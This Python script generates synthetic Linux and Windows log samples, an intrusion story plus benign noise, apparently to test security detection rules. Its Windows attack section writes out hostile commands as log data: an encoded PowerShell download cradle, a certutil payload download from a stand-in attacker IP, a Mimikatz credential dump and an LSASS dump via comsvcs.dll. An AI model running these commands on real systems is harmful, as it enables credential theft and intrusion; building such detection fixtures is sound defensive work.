"""Generate the deterministic sample logs in ``samples/``.

* ``samples/attack/``  - a realistic intrusion story mixed with normal background noise.
* ``samples/benign/``  - background noise only. Used by the test suite as a
  false-positive check: no rule may fire on it.

The attack story
----------------
Linux web server ``web01`` (attacker 203.0.113.45):
  web shell tries sudo as www-data -> SSH password spray -> brute force of root
  -> password guessed for ``deploy`` -> root shell via sudo -> backdoor user
  ``sysupdate`` created and added to the sudo group.

Windows domain (attacker 198.51.100.23):
  password spray against DC01 -> successful logon as jsmith -> macro document
  on WS-FIN-07 launches encoded PowerShell -> certutil downloads a tool ->
  LSASS accessed and dumped with comsvcs.dll -> backdoor account added to
  Domain Admins / local Administrators -> scheduled task + service persistence
  -> Security log cleared on DC01.

Run:  python scripts/generate_samples.py
"""

from __future__ import annotations

import base64
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent / "samples"
MONTHS = ("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")
DAY = datetime(2026, 11, 18, tzinfo=timezone.utc)
LINUX_ATTACKER = "203.0.113.45"
WIN_ATTACKER = "198.51.100.23"

SEC = "Security"
SYS = "System"
SYSMON = "Microsoft-Windows-Sysmon/Operational"
DEFENDER = r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"


# --------------------------------------------------------------------------- Linux


class AuthLog:
    def __init__(self) -> None:
        self.lines: list[tuple[datetime, str]] = []

    def add(self, ts: datetime, host: str, prog: str, pid: int, msg: str) -> None:
        stamp = f"{MONTHS[ts.month - 1]} {ts.day:>2} {ts:%H:%M:%S}"
        self.lines.append((ts, f"{stamp} {host} {prog}[{pid}]: {msg}"))

    def write(self, path: Path) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        ordered = sorted(self.lines, key=lambda item: item[0])
        path.write_text("".join(line + "\n" for _, line in ordered), encoding="utf-8", newline="\n")


def linux_noise(log: AuthLog, rng: random.Random, start: datetime, hours: int) -> None:
    users = {"alice": ("10.0.0.12", 1000), "bob": ("10.0.0.15", 1001), "carol": ("10.0.0.21", 1003)}
    hosts = ("web01", "db01")
    end = start + timedelta(hours=hours)

    cron = start
    while cron < end:
        for host in hosts:
            log.add(
                cron,
                host,
                "CRON",
                rng.randint(2000, 9000),
                "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)",
            )
        cron += timedelta(minutes=30)

    t = start
    while t < end:
        t += timedelta(minutes=rng.randint(7, 25), seconds=rng.randint(0, 59))
        host = rng.choice(hosts)
        user = rng.choice(sorted(users))
        ip, uid = users[user]
        pid, port = rng.randint(1000, 30000), rng.randint(40000, 65000)
        if rng.random() < 0.15:  # a typo, then success
            log.add(t, host, "sshd", pid, f"Failed password for {user} from {ip} port {port} ssh2")
            t += timedelta(seconds=rng.randint(3, 15))
            log.add(t, host, "sshd", pid, f"Accepted password for {user} from {ip} port {port} ssh2")
        else:
            fingerprint = "".join(
                rng.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") for _ in range(43)
            )
            log.add(
                t,
                host,
                "sshd",
                pid,
                f"Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:{fingerprint}",
            )
        log.add(
            t + timedelta(seconds=1),
            host,
            "sshd",
            pid,
            f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) by (uid=0)",
        )
        if rng.random() < 0.4:
            cmd = rng.choice(
                [
                    "/usr/bin/apt update",
                    "/usr/bin/systemctl restart nginx",
                    "/usr/bin/journalctl -u nginx --since today",
                    "/usr/bin/tail -n 100 /var/log/syslog",
                ]
            )
            log.add(
                t + timedelta(minutes=rng.randint(1, 5)),
                host,
                "sudo",
                rng.randint(1000, 30000),
                f"   {user} : TTY=pts/{rng.randint(0, 3)} ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}",
            )
        log.add(
            t + timedelta(minutes=rng.randint(6, 40)),
            host,
            "sshd",
            pid,
            f"pam_unix(sshd:session): session closed for user {user}",
        )


def linux_attack(log: AuthLog, rng: random.Random) -> None:
    host, ip = "web01", LINUX_ATTACKER
    t = DAY.replace(hour=12, minute=41, second=7)
    log.add(
        t,
        host,
        "sudo",
        14211,
        "www-data : user NOT in sudoers ; TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/sh",
    )

    t = DAY.replace(hour=13, minute=2, second=11)
    sshd = 22841
    for user in ("admin", "test", "oracle", "ubuntu", "guest", "pi"):
        port = rng.randint(40000, 65000)
        log.add(t, host, "sshd", sshd, f"Invalid user {user} from {ip} port {port}")
        log.add(
            t + timedelta(seconds=1),
            host,
            "sshd",
            sshd,
            f"Failed password for invalid user {user} from {ip} port {port} ssh2",
        )
        t += timedelta(seconds=rng.randint(4, 9))
        sshd += 1
    for _ in range(12):
        log.add(t, host, "sshd", sshd, f"Failed password for root from {ip} port {rng.randint(40000, 65000)} ssh2")
        t += timedelta(seconds=rng.randint(2, 6))
        sshd += 1
    for _ in range(6):
        log.add(t, host, "sshd", sshd, f"Failed password for deploy from {ip} port {rng.randint(40000, 65000)} ssh2")
        t += timedelta(seconds=rng.randint(2, 6))
        sshd += 1
    port = rng.randint(40000, 65000)
    log.add(t, host, "sshd", sshd, f"Accepted password for deploy from {ip} port {port} ssh2")
    log.add(
        t + timedelta(seconds=1),
        host,
        "sshd",
        sshd,
        "pam_unix(sshd:session): session opened for user deploy(uid=1005) by (uid=0)",
    )

    t += timedelta(minutes=2, seconds=14)
    log.add(t, host, "sudo", 23090, "  deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")
    t += timedelta(seconds=41)
    log.add(
        t,
        host,
        "useradd",
        23131,
        "new user: name=sysupdate, UID=1002, GID=1002, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1",
    )
    t += timedelta(seconds=6)
    log.add(t, host, "usermod", 23140, "add 'sysupdate' to group 'sudo'")


# --------------------------------------------------------------------------- Windows


def iso7(ts: datetime) -> str:
    """PowerShell's round-trip ("o") format uses 7 fractional digits."""
    return ts.strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"


class WinLog:
    def __init__(self) -> None:
        self.records: list[tuple[datetime, dict]] = []

    def add(self, ts: datetime, event_id: int, channel: str, computer: str, data: dict) -> None:
        self.records.append(
            (ts, {"TimeCreated": iso7(ts), "Id": event_id, "Channel": channel, "Computer": computer, "EventData": data})
        )

    def write(self, path: Path) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        ordered = sorted(self.records, key=lambda item: item[0])
        path.write_text(
            "".join(json.dumps(r, ensure_ascii=False) + "\n" for _, r in ordered), encoding="utf-8", newline="\n"
        )


def logon(
    log: WinLog, ts: datetime, ok: bool, user: str, ip: str, logon_type: int = 3, host: str = "DC01.corp.local"
) -> None:
    data = {
        "SubjectUserName": "-",
        "TargetUserName": user,
        "TargetDomainName": "CORP",
        "LogonType": str(logon_type),
        "LogonProcessName": "NtLmSsp",
        "WorkstationName": "-",
        "IpAddress": ip,
        "IpPort": str(random.Random(ts.timestamp()).randint(49152, 65535)),
        "ProcessName": "-",
    }
    if not ok:
        data.update({"Status": "0xc000006d", "SubStatus": "0xc000006a"})
    log.add(ts, 4624 if ok else 4625, SEC, host, data)


def proc(log: WinLog, ts: datetime, host: str, user: str, image: str, cmd: str, parent: str, pid: int) -> None:
    log.add(
        ts,
        1,
        SYSMON,
        host,
        {
            "UtcTime": ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "ProcessId": str(pid),
            "Image": image,
            "CommandLine": cmd,
            "CurrentDirectory": "C:\\Windows\\system32\\",
            "User": user,
            "ParentImage": parent,
            "Hashes": f"SHA256={random.Random(image).getrandbits(256):064x}",
        },
    )


def windows_noise(log: WinLog, rng: random.Random, start: datetime, hours: int) -> None:
    staff = {"jsmith": "10.0.1.31", "mjones": "10.0.1.32", "akhan": "10.0.1.40", "lchen": "10.0.1.44"}
    workstations = {"jsmith": "WS-FIN-07", "mjones": "WS-FIN-02", "akhan": "WS-HR-02", "lchen": "WS-IT-01"}
    end = start + timedelta(hours=hours)
    explorer = r"C:\Windows\explorer.exe"
    apps = [
        (r"C:\Program Files\Google\Chrome\Application\chrome.exe", '"{img}" --profile-directory=Default'),
        (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", '"{img}"'),
        (
            r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
            '"{img}" "C:\\Users\\{u}\\Documents\\Q4 budget.xlsx"',
        ),
        (r"C:\Windows\System32\notepad.exe", '"{img}"'),
    ]

    t = start
    while t < end:
        t += timedelta(minutes=rng.randint(4, 14), seconds=rng.randint(0, 59))
        user = rng.choice(sorted(staff))
        ws = workstations[user] + ".corp.local"
        if rng.random() < 0.1:
            logon(log, t, False, user, staff[user])
            t += timedelta(seconds=rng.randint(4, 20))
        logon(log, t, True, user, staff[user])

        image, template = rng.choice(apps)
        proc(
            log,
            t + timedelta(seconds=20),
            ws,
            f"CORP\\{user}",
            image,
            template.format(img=image, u=user),
            explorer,
            rng.randint(2000, 20000),
        )
        if image.endswith("OUTLOOK.EXE") and rng.random() < 0.5:  # user clicks a link in an email
            chrome = apps[0][0]
            proc(
                log,
                t + timedelta(seconds=95),
                ws,
                f"CORP\\{user}",
                chrome,
                f'"{chrome}" --single-argument https://intranet.corp.local/news',
                image,
                rng.randint(2000, 20000),
            )
        log.add(
            t + timedelta(seconds=25),
            22,
            SYSMON,
            ws,
            {
                "Image": apps[0][0],
                "QueryName": rng.choice(["intranet.corp.local", "www.bbc.co.uk", "outlook.office365.com"]),
            },
        )
        log.add(
            t + timedelta(seconds=26),
            3,
            SYSMON,
            ws,
            {
                "Image": apps[0][0],
                "User": f"CORP\\{user}",
                "SourceIp": staff[user],
                "SourcePort": str(rng.randint(49152, 65535)),
                "DestinationIp": f"142.250.{rng.randint(0, 255)}.{rng.randint(1, 254)}",
                "DestinationPort": "443",
            },
        )
        if rng.random() < 0.3:  # Defender scanning LSASS is normal and filtered by the rule
            log.add(
                t + timedelta(seconds=40),
                10,
                SYSMON,
                ws,
                {
                    "SourceImage": DEFENDER,
                    "TargetImage": r"C:\Windows\system32\lsass.exe",
                    "GrantedAccess": "0x1010",
                    "SourceUser": "NT AUTHORITY\\SYSTEM",
                },
            )

    # Daily jobs that are benign but touch the same event IDs as the attack.
    inv = start + timedelta(hours=1, minutes=5)
    proc(
        log,
        inv,
        "WS-IT-01.corp.local",
        "CORP\\svc_inventory",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\inventory.ps1",
        r"C:\Windows\System32\svchost.exe",
        7712,
    )
    google = r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe"
    log.add(
        start + timedelta(hours=2, minutes=12),
        4698,
        SEC,
        "WS-HR-02.corp.local",
        {
            "SubjectUserName": "WS-HR-02$",
            "TaskName": "\\GoogleUpdateTaskMachineUA",
            "TaskContent": f"<Task><Actions><Exec><Command>{google}</Command><Arguments>/ua /installsource scheduler</Arguments></Exec></Actions></Task>",
        },
    )
    log.add(
        start + timedelta(hours=2, minutes=12, seconds=3),
        7045,
        SYS,
        "WS-HR-02.corp.local",
        {
            "ServiceName": "Google Update Service (gupdate)",
            "ImagePath": f'"{google}" /svc',
            "ServiceType": "user mode service",
            "StartType": "auto start",
            "AccountName": "LocalSystem",
        },
    )


def windows_attack(log: WinLog, rng: random.Random) -> None:
    ip = WIN_ATTACKER
    t = DAY.replace(hour=14, minute=10, second=3)
    targets = ("administrator", "jsmith", "mjones", "backup", "svc_sql", "helpdesk")
    for _ in range(2):
        for user in targets:
            logon(log, t, False, user, ip)
            t += timedelta(seconds=rng.randint(5, 15))
    t = DAY.replace(hour=14, minute=16, second=40)
    logon(log, t, True, "jsmith", ip)

    ws = "WS-FIN-07.corp.local"
    user = "CORP\\jsmith"
    explorer = r"C:\Windows\explorer.exe"
    word = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    t = DAY.replace(hour=14, minute=20, second=12)
    proc(log, t, ws, user, word, f'"{word}" /n "C:\\Users\\jsmith\\Downloads\\Invoice_7731.docm" /o ""', explorer, 6120)

    script = f"IEX (New-Object Net.WebClient).DownloadString('http://{ip}/s.ps1')"
    encoded = base64.b64encode(script.encode("utf-16-le")).decode()
    t += timedelta(seconds=48)
    proc(log, t, ws, user, ps, f"powershell.exe -nop -w hidden -enc {encoded}", word, 6388)
    log.add(
        t + timedelta(seconds=2),
        3,
        SYSMON,
        ws,
        {
            "Image": ps,
            "User": user,
            "SourceIp": "10.0.1.31",
            "SourcePort": "51544",
            "DestinationIp": ip,
            "DestinationPort": "80",
        },
    )

    t = DAY.replace(hour=14, minute=23, second=5)
    certutil = r"C:\Windows\System32\certutil.exe"
    proc(
        log,
        t,
        ws,
        user,
        certutil,
        rf"certutil.exe -urlcache -split -f http://{ip}/a.exe C:\Users\Public\a.exe",
        ps,
        6512,
    )
    log.add(
        t + timedelta(seconds=3),
        11,
        SYSMON,
        ws,
        {"Image": certutil, "TargetFilename": r"C:\Users\Public\a.exe", "User": user},
    )

    t = DAY.replace(hour=14, minute=25, second=30)
    tool = r"C:\Users\Public\a.exe"
    proc(log, t, ws, user, tool, rf"{tool} privilege::debug sekurlsa::logonpasswords exit", ps, 6644)
    log.add(
        t + timedelta(seconds=1),
        10,
        SYSMON,
        ws,
        {
            "SourceImage": tool,
            "TargetImage": r"C:\Windows\system32\lsass.exe",
            "GrantedAccess": "0x1010",
            "SourceUser": user,
            "CallTrace": r"C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00007FF6A1B2C3D4)",
        },
    )

    t = DAY.replace(hour=14, minute=27, second=2)
    rundll = r"C:\Windows\System32\rundll32.exe"
    proc(
        log,
        t,
        ws,
        user,
        rundll,
        rf"{rundll} C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Users\Public\l.dmp full",
        ps,
        6730,
    )

    dc = "DC01.corp.local"
    t = DAY.replace(hour=14, minute=35, second=10)
    log.add(
        t,
        4720,
        SEC,
        dc,
        {
            "SubjectUserName": "jsmith",
            "SubjectDomainName": "CORP",
            "TargetUserName": "svc_backup2",
            "TargetDomainName": "CORP",
        },
    )
    log.add(
        t + timedelta(seconds=12),
        4728,
        SEC,
        dc,
        {
            "SubjectUserName": "jsmith",
            "SubjectDomainName": "CORP",
            "MemberName": "CN=svc_backup2,CN=Users,DC=corp,DC=local",
            "MemberSid": "S-1-5-21-3623811015-3361044348-30300820-1112",
            "TargetUserName": "Domain Admins",
            "TargetDomainName": "CORP",
        },
    )
    log.add(
        t + timedelta(minutes=1, seconds=4),
        4732,
        SEC,
        ws,
        {
            "SubjectUserName": "jsmith",
            "SubjectDomainName": "CORP",
            "MemberName": "-",
            "MemberSid": "S-1-5-21-3623811015-3361044348-30300820-1112",
            "TargetUserName": "Administrators",
            "TargetDomainName": "Builtin",
        },
    )

    t = DAY.replace(hour=14, minute=38, second=44)
    log.add(
        t,
        4698,
        SEC,
        ws,
        {
            "SubjectUserName": "jsmith",
            "SubjectDomainName": "CORP",
            "TaskName": "\\Microsoft\\Windows\\Maintenance\\SysUpdate",
            "TaskContent": "<Task><Triggers><LogonTrigger/></Triggers><Actions><Exec><Command>powershell.exe</Command>"
            "<Arguments>-w hidden -nop -file C:\\Users\\Public\\u.ps1</Arguments></Exec></Actions></Task>",
        },
    )
    t = DAY.replace(hour=14, minute=40, second=19)
    log.add(
        t,
        7045,
        SYS,
        ws,
        {
            "ServiceName": "WinSvcHelper",
            "ImagePath": r"%COMSPEC% /c C:\Users\Public\a.exe",
            "ServiceType": "user mode service",
            "StartType": "demand start",
            "AccountName": "LocalSystem",
        },
    )
    t = DAY.replace(hour=14, minute=45, second=57)
    log.add(t, 1102, SEC, dc, {"SubjectUserName": "jsmith", "SubjectDomainName": "CORP", "SubjectLogonId": "0x3e7a1f"})


# --------------------------------------------------------------------------- main


def main() -> None:
    start = DAY.replace(hour=8)

    attack_linux, attack_win = AuthLog(), WinLog()
    linux_noise(attack_linux, random.Random(1), start, 10)
    linux_attack(attack_linux, random.Random(2))
    windows_noise(attack_win, random.Random(3), start, 10)
    windows_attack(attack_win, random.Random(4))
    attack_linux.write(ROOT / "attack" / "auth.log")
    attack_win.write(ROOT / "attack" / "windows-events.jsonl")

    benign_linux, benign_win = AuthLog(), WinLog()
    linux_noise(benign_linux, random.Random(11), start, 24)
    windows_noise(benign_win, random.Random(13), start, 24)
    benign_linux.write(ROOT / "benign" / "auth.log")
    benign_win.write(ROOT / "benign" / "windows-events.jsonl")

    for path in sorted(ROOT.rglob("*.*")):
        lines = sum(1 for _ in path.open(encoding="utf-8"))
        print(f"{path.relative_to(ROOT.parent)}: {lines} lines")


if __name__ == "__main__":
    main()
